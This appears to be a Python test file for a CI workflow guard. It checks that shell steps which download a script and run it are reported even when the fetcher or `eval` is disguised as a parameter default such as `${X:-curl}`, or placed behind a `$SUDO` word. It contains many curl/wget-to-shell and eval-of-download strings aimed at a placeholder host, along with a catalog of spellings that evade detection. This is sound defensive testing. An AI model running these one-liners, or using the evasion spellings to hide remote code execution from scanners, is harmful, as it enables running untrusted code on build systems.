"""#2963: a command word that is a ONE-WORD default is read as the command its default names.

`main` reads `${X:-sh}` as `sh` (#2337) and a default holding a blank as its words (#2731). A one-word default
naming a fetcher or `eval` stayed a word the guard does not follow, so `${X:-curl} -fsSL URL | sh` read CLEAN under
every `shell:` setting while every parent shell runs the download. The second walk now reads such a default as the
command it names (`shell_defaults.WALKED_DEFAULTS`) and drops a `$` word in front of it, as bash may. The main pass
reads the word as `main` does, so the job reports wherever either reading does.

Marks are a letter a `shell:` setting -- unset, `bash`, `sh`, `bash {0}`, `sh {0}` -- R where the guard reports,
C where it reads the step CLEAN: first the job's, then the main pass's, which is `main`'s own reading.

Truth, in the comments, is what eight parent shells do with the step in two passes on the forge: bash 5.2.21 and
bash 3.2.57 under `-e` and under `-eo pipefail`, dash under `-e`, then each without `-e`; pass 2 gives each parent
a child of its own family. "runs" is all sixteen ran the download, "nothing" is none fetched or ran. My runner and
the coordinator's agree on the 30 rows of the issue.

Named limits, pinned in `TestThePrice`. The default is read whatever the step did to its name (#2899's class):
`X=echo` in front makes bash run `echo`, and the row reports -- 28 of the hunt's 48 such rows. So does an alternate
(`:+`, `+`) whose name nothing sets, and one in a child shell's program whose name the step set and did not
export. `main` reads a shell's default and a default holding a blank the same way. The rows that need #2955's
printer readings as well report, now that both are in (`TestTheRowsThatNeedThePrinters`). `eval`, `.` and `source`
behind a word bash may drop (`$SUDO eval 'P'`) read CLEAN on `main`, whose list of the names such a word may stand
in front of holds no builtin; #2997 reads them, and a default naming one with them
(`TestEvalDotAndSourceBehindAWordBashMayDrop`).
"""
import unittest

import shell_command
import workflow_guard as wg
import workflow_options as wo

SHELLS = (None, "bash", "sh", "bash {0}", "sh {0}")
U = "https://example.test/t"
NOW = ("RRRRR", "CCCCC")            # the job reports; the main pass reads it CLEAN, as `main` did
BEFORE = ("RRRRR", "RRRRR")         # `main` reported it already
CLEAN = ("CCCCC", "CCCCC")
PIPED, FILED = "-fsSL %s | sh" % U, "-fsSLo t %s\nsh t" % U
# The six operators, with what sets the name where the operator takes its word from a SET one.
OPERATORS = (("", ":-"), ("", "-"), ("", ":="), ("", "="), ("X=1\n", ":+"), ("X=1\n", "+"))


def marks(text):
    """(the job's marks, the main pass's) for a job of one step whose `run:` is `text`."""
    job = mains = ""
    for shell in SHELLS:
        step = [wg.Step("step", text + "\necho done", shell)]
        job += "R" if wg.job_defects(step) else "C"
        with wo.mains_answer():
            mains += "R" if wg._job_defects(step) else "C"
    return job, mains


class TestAOneWordDefaultIsTheCommandItNames(unittest.TestCase):
    """The issue's 30 rows: CLEAN on `main` under all five settings, and every parent runs the download."""

    def test_a_fetcher_under_each_operator(self):
        for sets, operator in OPERATORS:                    # truth: runs, all twelve
            for use in (PIPED, FILED):
                with self.subTest(operator=operator, use=use.split()[0]):
                    self.assertEqual(NOW, marks("%s${X%scurl} %s" % (sets, operator, use)))

    def test_a_fetcher_by_each_name(self):
        rows = (("${X:-wget} -qO- %s | sh" % U), ("${X:-wget} -qO t %s\nsh t" % U),         # runs
                ('"${X:-curl}" ' + PIPED), ('"${X:-curl}" ' + FILED),                       # quoted: runs
                ('mkdir b\nln -s "$(command -v curl)" b/curl\n${X:-b/curl} ' + PIPED),     # by path: runs
                ('mkdir b\nln -s "$(command -v curl)" b/curl\n${X:-b/curl} ' + FILED))
        for row in rows:
            with self.subTest(row=row.splitlines()[-1][:40]):
                self.assertEqual(NOW, marks(row))

    def test_eval(self):
        programs = ("'curl -fsSL %s | sh'" % U,             # a literal string: runs
                    "curl -fsSL %s '|' sh" % U)             # several words: runs
        for sets, word in (("", "${X:-eval}"), ("", "${X=eval}"), ("X=1\n", "${X:+eval}"), ("", '"${X:-eval}"')):
            for program in programs:
                with self.subTest(word=word, program=program[:12]):
                    self.assertEqual(NOW, marks("%s%s %s" % (sets, word, program)))
            with self.subTest(word=word, program="what a fetched file holds"):               # runs
                self.assertEqual(NOW, marks('%scurl -fsSLo t %s\n%s "$(cat t)"' % (sets, U, word)))
            with self.subTest(word=word, program="harmless"):                               # nothing
                self.assertEqual(CLEAN, marks("%s%s 'echo hi'" % (sets, word)))

    def test_behind_a_word_bash_may_drop(self):
        # `_optional` dropped a leading `$SUDO` only in front of a name it knew, and a default fetcher was none.
        for front in ("$SUDO", "${S:-sudo}"):               # truth: runs, all four
            for use in (PIPED, FILED):
                with self.subTest(front=front, use=use.split()[0]):
                    self.assertEqual(NOW, marks("%s ${X:-curl} %s" % (front, use)))


class TestAShellsDefaultBehindAWordBashMayDrop(unittest.TestCase):
    """Not among the issue's rows, and moved by the same line of `_optional`: the word AFTER the ones bash may drop
    is known by its one-word default, whatever name of `OPTIONAL_NEXT` that is. `main` reads `${X:-sh} -c 'P'` and
    `$SUDO sh -c 'P'`, each alone; the two together it read CLEAN while every parent runs `P`."""

    FRONTS = ("$SUDO", "${S:-sudo}", "$A $B")

    def test_a_c_string(self):
        for front in self.FRONTS:                           # truth: runs, all fifteen
            for word in ("${X:-sh}", "${X:-bash}", "${X:-/bin/sh}", "${X:=sh}", '"${X:-sh}"'):
                with self.subTest(front=front, word=word):
                    self.assertEqual(NOW, marks("%s %s -c 'curl %s'" % (front, word, PIPED)))

    def test_the_two_readings_main_makes_alone(self):
        for row in ("${X:-sh} -c 'curl %s'" % PIPED, "$SUDO sh -c 'curl %s'" % PIPED):     # truth: runs, both
            with self.subTest(row=row[:12]):
                self.assertEqual(BEFORE, marks(row))


class TestItReadsWhereverTheLiteralCommandIsRead(unittest.TestCase):
    """The default spelling reads as its literal twin reads, in every place the hunt put the fetch."""

    SHAPES = {                                              # truth, the twin's and the default's alike:
        "piped to a shell": "{F} -fsSL %s | sh" % U,                                        # runs
        "piped to `bash -s`": "{F} -fsSL %s | bash -s" % U,                                 # runs
        "piped to a shell behind a wrapper": "{F} -fsSL %s | sudo sh" % U,                  # runs
        "piped through `tee`": "{F} -fsSL %s | tee t | sh" % U,                             # runs
        "to a file a shell runs": "{F} -fsSLo t %s\nsh t" % U,                              # runs
        "to a file the step executes": "{F} -fsSLo t %s\nchmod +x t\n./t" % U,              # runs
        "to a file, in an and-list": "{F} -fsSLo t %s && sh t" % U,                         # runs
        "to a file the step sources": "{F} -fsSLo t %s\n. ./t" % U,                         # runs
        "redirected to a file": "{F} -fsSL %s > t\nsh t" % U,                               # runs
        "in a `-c` string": "sh -c '{F} -fsSL %s | sh'" % U,                                # runs
        "in a double-quoted `-c` string": 'bash -c "{F} -fsSL %s | sh"' % U,                # runs
        "in an `eval` string": "eval '{F} -fsSL %s | sh'" % U,                              # runs
        "in a quoted heredoc": "sh <<'EOF'\n{F} -fsSL %s | sh\nEOF" % U,                    # runs
        "in a function": "f() { {F} -fsSL %s | sh; }\nf" % U,                               # runs
        "in a subshell": "( {F} -fsSL %s | sh )" % U,                                       # runs
        "in a branch": "if true; then {F} -fsSL %s | sh; fi" % U,                           # runs
        "after `&&`": "true && {F} -fsSL %s | sh" % U,                                      # runs
        "carried in a variable": 'x=$({F} -fsSL %s)\neval "$x"' % U,                        # runs
        "as a shell's `<(...)` file": "sh <({F} -fsSL %s)" % U,                             # runs; dash refuses it
        "behind an assignment": "A=1 {F} -fsSL %s | sh" % U,                                # runs
        "with a check that fails": '{F} -fsSLo t %s\necho "0000  t" | sha256sum -c -\nsh t' % U,   # runs with no -e
    }

    def test_every_place(self):
        for place, shape in self.SHAPES.items():
            with self.subTest(place=place):
                self.assertEqual(BEFORE, marks(shape.replace("{F}", "curl")))
                self.assertEqual(NOW, marks(shape.replace("{F}", "${X:-curl}")))

    def test_a_default_that_only_fetches_stays_clean(self):
        for word in ("curl", "${X:-curl}", "${X=curl}"):    # truth: fetched, nothing ran
            with self.subTest(word=word):
                self.assertEqual(CLEAN, marks("%s -fsSLo t %s\ncat t" % (word, U)))


class TestWhatMainReadKeepsItsMarks(unittest.TestCase):
    def test_a_default_main_already_follows_or_reports(self):
        rows = ("curl -fsSLo t %s\n${X:-sh} t" % U,         # a shell, #2337: runs
                "curl -fsSLo t %s\n${X:-source} ./t" % U,   # runs
                "curl -fsSLo t %s\n${X:-exec} sh t" % U,    # runs
                "curl -fsSLo t %s\n${X:-sudo} sh t" % U,    # an optional wrapper, #2472: runs
                "curl -fsSL %s | ${X:-bash}" % U,           # runs
                "curl -fsSL %s | ${X:-env} sh" % U,         # runs
                "sudo ${X:-curl} " + PIPED,                 # behind a literal wrapper: reported unread; runs
                "env A=1 ${X:-curl} " + FILED,              # runs
                "${X:-curl -fsSL} %s | sh" % U,             # a default holding a blank, #2731: runs
                "${X:-} curl " + PIPED,                     # an empty default: runs
                "curl " + PIPED)                            # the literal command
        for row in rows:
            with self.subTest(row=row.splitlines()[-1][:40]):
                self.assertEqual(BEFORE, marks(row))

    def test_a_word_that_names_no_command_stays_clean(self):
        for row in ("$X " + PIPED, "$X " + FILED,           # a bare variable: nothing
                    "${X:-echo} " + FILED):                 # a harmless default: nothing
            with self.subTest(row=row[:20]):
                self.assertEqual(CLEAN, marks(row))


class TestThePrice(unittest.TestCase):
    """The default is read whatever the step did to its name. Where bash then runs something else, the row
    reports though no parent runs the download: #2899's class, as `main` already reads a shell's default."""

    def test_the_name_is_assigned_in_the_step(self):
        for sets, operator, truth in (
                ("X=echo\n", ":-", "nothing"), ("X=echo\n", "=", "nothing"), ("X=true\n", "-", "nothing"),
                ("export X=echo\n", ":=", "nothing"),
                ("X=\n", "-", "nothing"),                   # set and empty, no colon: the word is empty
                ("X=\n", ":-", "runs"),                     # set and empty, a colon: the default
                ("X=curl\n", ":-", "runs"), ("X=echo\nunset X\n", "-", "runs")):
            with self.subTest(sets=sets.strip(), operator=operator, truth=truth):
                self.assertEqual(NOW, marks("%s${X%scurl} %s" % (sets, operator, PIPED)))

    def test_an_alternate_whose_name_nothing_sets(self):
        # `main` reads an alternate's word whatever its name holds -- `${X:+sh} t`, or a `${X:+curl -fsSL}`
        # holding a blank, both reported with the name unset. A one-word fetcher or `eval` now reads the same.
        for row, truth in (("${X:+curl} " + PIPED, "nothing"), ("${X+curl} " + FILED, "nothing"),
                           ("${X:+eval} 'curl -fsSL %s | sh'" % U, "nothing"),
                           ("X=\n${X:+curl} " + PIPED, "nothing"),     # set and empty, a colon: the word is empty
                           ("X=\n${X+curl} " + PIPED, "runs")):        # set and empty, no colon: the alternate
            with self.subTest(row=row[:16], truth=truth):
                self.assertEqual(NOW, marks(row))

    def test_the_name_is_set_but_not_exported_to_the_shell_that_reads_the_default(self):
        for row in ("X=1\nsh -c '${X:+curl} %s'" % PIPED,   # truth: nothing; the literal twin runs
                    "X=1\nsh <<'EOF'\n${X+curl} %s\nEOF" % PIPED):
            with self.subTest(row=row.splitlines()[1][:12]):
                self.assertEqual(NOW, marks(row))

    def test_an_alternate_naming_a_shell_behind_a_word_bash_may_drop(self):
        # With `X` unset `${X:+sh}` is nothing: bash runs `-c` as a command, or `t`, and nothing of the download.
        # `main` reports the alternate with no word in front, the same price; behind one it now reads the same.
        for front in TestAShellsDefaultBehindAWordBashMayDrop.FRONTS:
            for row, truth in (("%s ${X:+sh} -c 'curl %s'" % (front, PIPED), "nothing"),
                               ("curl -fsSLo t %s\n%s ${X:+sh} t" % (U, front), "the fetch alone")):
                with self.subTest(front=front, truth=truth):
                    self.assertEqual(NOW, marks(row))
        for row in ("${X:+sh} -c 'curl %s'" % PIPED, "curl -fsSLo t %s\n${X:+sh} t" % U):     # `main`'s, #2337
            with self.subTest(row=row[:12]):
                self.assertEqual(BEFORE, marks(row))


class TestEvalDotAndSourceBehindAWordBashMayDrop(unittest.TestCase):
    """#2997's rows. `main` drops a `$` word only in front of a shell, a wrapper, an interpreter or a fetcher
    (#2472), so `$SUDO eval 'P'`, `$SUDO . ./t` and `$SUDO source ./t` read CLEAN there while the parents run them.
    #2963's PR pinned them so; #2997 reads the builtin behind such a word, and a default naming it with it. The
    rule's own pins are in `tests/test_workflow_word_before_a_builtin.py`."""

    FRONTS = ("$SUDO", "$A $B")

    def test_eval(self):
        for front in self.FRONTS:                           # truth: runs, all eight
            for word in ("eval", "${X:-eval}"):
                for use, row in (("string", "%s %s 'curl %s'" % (front, word, PIPED)),
                                 ("file", 'curl -fsSLo t %s\n%s %s "$(cat t)"' % (U, front, word))):
                    with self.subTest(front=front, word=word, use=use):
                        self.assertEqual(NOW, marks(row))

    def test_dot_and_source(self):
        for front in self.FRONTS:           # truth: `.` runs, all four; `source` runs under bash, and dash has none
            for word in (".", "${X:-.}", "source", "${X:-source}"):
                with self.subTest(front=front, word=word):
                    self.assertEqual(NOW, marks("curl -fsSLo t %s\n%s %s ./t" % (U, front, word)))

    def test_with_no_word_in_front_each_is_reported(self):
        for row in ("eval 'curl %s'" % PIPED, "curl -fsSLo t %s\n. ./t" % U, "curl -fsSLo t %s\nsource ./t" % U,
                    "curl -fsSLo t %s\n${X:-.} ./t" % U, "curl -fsSLo t %s\n${X:-source} ./t" % U):
            with self.subTest(row=row.splitlines()[-1][:14]):
                self.assertEqual(BEFORE, marks(row))


class TestTheSecondWalkAlone(unittest.TestCase):
    """The reading is the second walk's: off while the main pass runs, and back on after it, however it ends."""

    def test_the_default_is_read_outside_the_main_pass_and_not_inside_it(self):
        self.assertEqual(["curl"], shell_command._shell_default("${X:-curl}"))
        self.assertEqual(["/usr/bin/wget"], shell_command._shell_default("${X:=/usr/bin/wget}"))
        self.assertEqual(["eval"], shell_command._shell_default("${X:+eval}"))
        self.assertIsNone(shell_command._shell_default("${X:-echo}"))
        self.assertIsNone(shell_command._shell_default("${X:-curl}l"))
        with wo.mains_answer():
            self.assertFalse(shell_command.WALKED_DEFAULTS.get())
            self.assertIsNone(shell_command._shell_default("${X:-curl}"))
            self.assertIsNone(shell_command._shell_default("${X:+eval}"))
            self.assertEqual(["sh"], shell_command._shell_default("${X:-sh}"))          # `main`'s, #2337
        self.assertTrue(shell_command.WALKED_DEFAULTS.get())

    def test_the_flag_comes_back_when_the_main_pass_raises(self):
        with self.assertRaises(KeyError), wo.mains_answer():
            raise KeyError("the pass")
        self.assertTrue(shell_command.WALKED_DEFAULTS.get())

    def test_a_dollar_word_in_front_is_dropped_in_the_second_walk_alone(self):
        argv = ["$SUDO", "${X:-curl}", "-fsSL", U]
        self.assertEqual(1, shell_command._optional(argv))
        self.assertEqual("curl", shell_command.command(argv)[0])
        self.assertEqual(1, shell_command._optional(["$SUDO", "${X:=/usr/bin/wget}", U]))     # by its basename
        self.assertEqual(0, shell_command._optional(["$SUDO", "${X:-echo}", "hi"]))     # a name it does not know
        with wo.mains_answer():
            self.assertEqual(0, shell_command._optional(argv))
            self.assertEqual("$SUDO", shell_command.command(argv)[0])
            self.assertEqual(1, shell_command._optional(["$SUDO", "curl", U]))         # `main`'s, #2472

    def test_the_default_is_marked_as_a_name_nobody_wrote(self):
        word = shell_command.command(["${X:-curl}", "-fsSL", U])[0]
        self.assertIsInstance(word, shell_command.Defaulted)


class TestTheRowsThatNeedThePrinters(unittest.TestCase):
    """#2955's rows that need both readings: what a printer writes (#2979) and this rule for the printed line's
    command word. This PR is the second of the two to merge, and with both each reports."""

    LINE = "${X:-curl} -fsSLo t %s" % U

    def test_a_printed_line_whose_command_word_is_a_default(self):
        for name, step in (
                ("PF-fetch-run", "printf '%%s\\n' '%s' | sh\nsh t" % self.LINE),     # runs; the line is what `printf` writes
                ("its `echo` twin", "echo '%s' | sh\nsh t" % self.LINE),                # runs
                ("EVS-fetch-run", "eval \"$(echo '%s')\"\nsh t" % self.LINE),        # runs; the line is what `echo` writes
                ("in a `-c` string", "sh -c '%s'\nsh t" % self.LINE)):                 # runs
            with self.subTest(row=name):
                self.assertEqual(NOW, marks(step))


if __name__ == "__main__":
    unittest.main()
